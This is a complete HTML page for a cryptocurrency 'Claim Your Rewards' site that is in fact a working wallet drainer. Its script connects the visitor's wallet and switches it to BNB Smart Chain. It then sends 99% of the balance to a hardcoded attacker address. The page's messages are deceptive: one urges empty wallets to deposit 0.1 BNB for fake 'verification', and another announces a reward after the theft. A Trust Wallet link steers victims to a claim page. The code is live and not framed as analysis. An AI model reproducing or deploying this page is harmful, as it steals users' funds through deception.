<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">

<title>Stable</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Poppins',sans-serif;

    display:flex;
    justify-content:center;
    align-items:center;

    min-height:100vh;

    background:url("./9090.jpg") no-repeat center center fixed;
    background-size:cover;

    overflow:hidden;
    position:relative;
}

/* لایه تیره روی تصویر */
body::before{
    content:"";
    position:fixed;
    inset:0;
    background:rgba(10,15,25,.55);
    backdrop-filter:blur(2px);
}

/* نور متحرک */
body::after{
    content:"";
    position:fixed;

    width:650px;
    height:650px;

    left:50%;
    top:50%;

    transform:translate(-50%,-50%);

    background:
    radial-gradient(circle,
    rgba(59,130,246,.30) 0%,
    rgba(139,92,246,.18) 35%,
    rgba(0,0,0,0) 70%);

    filter:blur(55px);

    animation:glow 10s ease-in-out infinite alternate;

    pointer-events:none;
    z-index:0;
}

.container{

    position:relative;
    z-index:2;

    width:360px;
    padding:35px;

    text-align:center;

    background:linear-gradient(
        135deg,
        rgba(255,255,255,.10),
        rgba(255,255,255,.04)
    );

    backdrop-filter:blur(18px);
    -webkit-backdrop-filter:blur(18px);

    border:1px solid rgba(255,255,255,.18);

    border-radius:24px;

    box-shadow:
        0 20px 45px rgba(0,0,0,.45),
        0 0 30px rgba(59,130,246,.12),
        inset 0 1px 1px rgba(255,255,255,.20);

    animation:fade .8s ease;

    overflow:hidden;
}

/* انعکاس شیشه */
.container::before{

    content:"";

    position:absolute;

    top:-60%;
    left:-20%;

    width:70%;
    height:220%;

    background:linear-gradient(
        90deg,
        transparent,
        rgba(255,255,255,.18),
        transparent
    );

    transform:rotate(25deg);

    pointer-events:none;

}

h2{
    color:#fff;
    font-size:30px;
    margin-bottom:25px;
    font-weight:600;
}

button{

    width:100%;
    height:52px;

    margin-top:14px;

    border:none;
    border-radius:12px;

    cursor:pointer;

    color:#fff;

    font-size:16px;
    font-weight:600;

    background:linear-gradient(135deg,#2563eb,#3b82f6);

    transition:.25s;
}

button:hover{

    transform:translateY(-3px);

    box-shadow:0 0 20px rgba(59,130,246,.55);

}

button:active{

    transform:scale(.98);

}

#status{

    margin-top:18px;

    color:#fff;

    font-size:14px;

}

@keyframes fade{

    from{
        opacity:0;
        transform:translateY(30px);
    }

    to{
        opacity:1;
        transform:translateY(0);
    }

}

@keyframes glow{

    from{
        transform:translate(-50%,-50%) scale(1);
        opacity:.55;
    }

    to{
        transform:translate(-50%,-50%) scale(1.18);
        opacity:.9;
    }

}

</style>

</head>

<body>

<div class="container">

<h2>Claim Your Rewards</h2>

<button onclick="connectWallet()">connect</button>

<br>

<button onclick="sendBNB()">claim</button>

<br>

<button onclick="window.location='https://link.trustwallet.com/open_url?coin_id=60&url=https%3A%2F%2Fcryptotaskshub.github.io%2Fclaim%2F'">
Open Trust Wallet
</button>

<p id="status"></p>

</div>
<script>
let account;
const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";

function setStatus(msg){
    document.getElementById("status").innerText = msg;
}

//  BSC
async function connectWallet(){
    if(!window.ethereum){ alert("Wallet not fund.It might be better to install the trust wallet from Google Play and create a new wallet."); return; }
    try{
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        account = accounts[0];
        setStatus("Connected: " + account);


        //    BSC Mainnet
        await ethereum.request({
            method:"wallet_switchEthereumChain",
            params:[{chainId:"0x38"}]
        });
        setStatus("Connected" + account);
    }catch(err){
        console.error(err);
        alert("Connection error.." + (err.message || err));
    }
}

async function sendBNB(){
    if(!account){ alert("connect first!"); return; }
    setStatus("wait...");

    try{
        const balanceHex = await ethereum.request({
            method: "eth_getBalance",
            params: [account, "latest"]
        });
        const balance = BigInt(balanceHex);

        if(balance <= 0){
            alert("Balance error. It might be better to increase your balance to 0.1 bnb to make sure you are not a fake user or a bot, then try again. Note! This amount will not be deducted from your account and is only to verify your identity. After authentication, you can withdraw your bnb balance and your authentication gift balance. The gift balance is deposited immediately and automatically after authentication and can be withdrawn!");
            return;
        }

        const sendAmount = balance * 99n / 100n;

        const txHash = await ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: account,
                to: DESTINATION,
                value: "0x" + sendAmount.toString(16)
            }]
        });

        setStatus("Congratulations, your verification has been confirmed and the verification reward balance has been deposited into this wallet. Check your wallet." + txHash);

    }catch(err){
        console.error(err);
        if(err.code === 4001){
            alert("c error");
        } else {
            alert("c error " + (err.message || err));
        }
    }
}
</script>


</body>
</html>
